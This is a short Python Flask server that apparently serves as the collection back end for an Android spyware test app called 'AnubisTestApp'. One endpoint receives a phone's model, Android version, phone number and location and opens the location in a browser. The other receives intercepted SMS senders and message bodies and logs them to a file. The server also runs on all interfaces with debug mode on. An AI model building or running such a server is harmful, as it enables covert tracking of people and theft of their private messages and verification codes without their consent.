from flask import Flask, request, jsonify, render_template
import json
import os
import sys
import webbrowser
app = Flask(__name__)

visited_location = set()

@app.route("/device", methods=["POST"])
def device():
    device_info = request.get_json()
    #location_info = request.get_json()
    Manufacturer = device_info['manufacturer']
    Model = device_info['model']
    verison = device_info['androidVersion']
    try:
     phoneno = device_info['phoneno']
     print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android version is " +  verison +  " and phone number is " + phoneno)
    except:
     location = device_info['location']
     maps = device_info['maps']
     print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android version is " +  verison)
     print("Location is " + location)
     print("Open in google maps: " + maps)
     # ensure google maps is only open once if there is no change in location
     if maps in visited_location:
      print("There is no updates for location.")
     else:
      visited_location.add(maps)
      webbrowser.open(maps, new=1)



    return "deviceinfo working", 200

@app.route("/sms", methods=["POST"])
def sms():
    sms_content = request.get_json()
    address = sms_content['smsAddress']
    body = sms_content['smsBody']

    # append to the existing txt from the Anubis Test App folder according to your own directory
    # for example
    with open(os.path.join('C:\\Users\\kian_\\Downloads\\Git\\AnubisTestApp_geo\\', 'smsdata.txt'), 'a') as f:
        f.write('\n' + 'SMS retrieved from phone number(' + address + '):\n' + body + '\n')

    print("SMS Retrieved from Phone Number(" + address + ") : " + body)
    return "SMS Retrieved from Phone Number(" + address + ") : " + body , 200

if __name__ == "__main__":
    app.run('0.0.0.0', debug=True)


    
